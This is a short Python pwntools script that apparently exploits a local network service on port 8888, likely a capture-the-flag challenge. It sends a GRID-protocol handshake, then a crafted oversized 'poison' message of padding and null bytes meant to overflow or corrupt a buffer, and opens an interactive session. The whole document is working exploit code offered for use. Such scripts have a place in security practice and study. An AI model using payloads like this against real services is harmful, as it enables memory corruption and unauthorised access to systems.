
from pwn import *

context.log_level = "debug"


# send a message of maxlength=1024+512

def build_poison_message(message):
    pld  = b"GRID"
    pld += b"_"
    pld += b"2"
    pld += b"_"
    pld += str(len(message)).encode()
    pld += b"_"
    pld += message
    pld += b"_=&O#"
    return pld

p = process(["nc", "localhost", "8888"])
p.send(b"GRID_5_4_Jack_=&O#")
sleep(1)

# build payload
payload  = b"z"*800
payload += b"\x00"*200
payload += b"\x00"*200
p.send(build_poison_message(payload))
sleep(1)

p.interactive()



